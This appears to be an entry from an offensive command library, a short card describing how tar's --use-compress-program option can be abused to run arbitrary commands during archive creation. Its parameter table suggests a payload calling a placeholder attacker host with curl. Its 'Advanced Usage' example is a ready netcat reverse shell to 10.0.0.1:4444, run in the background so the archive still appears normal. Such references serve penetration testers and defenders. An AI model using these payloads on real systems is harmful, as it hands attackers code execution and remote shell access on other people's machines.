---
type: command
executor: bash
data: tar --use-compress-program='$_PROGRAM_COMMAND' -cf $_OUTPUT_ARCHIVE $_FILES
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
  - Unix
tags:
  - injection
  - compression
  - tar
verified: true
validated: true
---

# tar-compression-program-injection

## Command

```bash
tar --use-compress-program='$_PROGRAM_COMMAND' -cf $_OUTPUT_ARCHIVE $_FILES
```

## Description

Overrides the compression program with a custom command, allowing injection during archive creation to execute arbitrary code.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --use-compress-program | Specify custom compressor | Yes |
| $_PROGRAM_COMMAND | Malicious program (e.g., sh -c 'curl attacker.com') | Yes |
| -c | Create archive | Yes |
| -f | Output file | Yes |
| $_OUTPUT_ARCHIVE | Path for new archive (e.g., output.tar.gz) | Yes |
| $_FILES | Files/directories to archive | Yes |

## Examples

### Basic Usage

```bash
tar --use-compress-program='sh -c "echo test"' -cf out.tar files/
```

### Advanced Usage

```bash
tar --use-compress-program='sh -c "nc -e /bin/sh 10.0.0.1 4444 &"' -cf out.tar files/
```

## Expected Output

"tar: Wrote X bytes". Injected command executes in background.

## Related

- [[procedures/TAR-Argument-Injection]]
